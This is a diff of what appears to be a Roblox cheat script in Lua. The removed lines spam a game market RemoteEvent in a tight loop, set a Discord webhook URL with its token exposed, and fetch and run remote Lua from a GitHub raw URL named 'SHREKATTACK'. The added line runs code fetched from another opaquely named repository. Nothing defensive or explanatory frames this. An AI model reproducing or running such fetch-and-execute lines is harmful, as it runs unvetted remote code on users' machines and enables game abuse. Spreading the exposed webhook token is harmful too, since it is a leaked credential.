@@ -45,27 +45,4 @@ while true do
 end
 
 
-
-
-
-
-while true do
-    local args = {
-        [1] = "Cactus",
-        [2] = "1"
-    }
-
-    game:GetService("ReplicatedStorage"):WaitForChild("WorldMarket_Remotes"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
-
-    -- Optionally, you can add a delay here to control how often the event is fired
-    wait(0.1)  -- Wait for 5 seconds before firing the event again
-end
-
-
-
-
-
-
-_G.webhooksdiscord = "https://discord.com/api/webhooks/1188889579487502346/6o7roIXFZiCWnBhLXHMyfgXIelEOeXkSd7T9O1tk3LyHEAIzCguy2SJPBXz6-PkF0ydX"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dodeadsadasda/-/main/d"),true)()
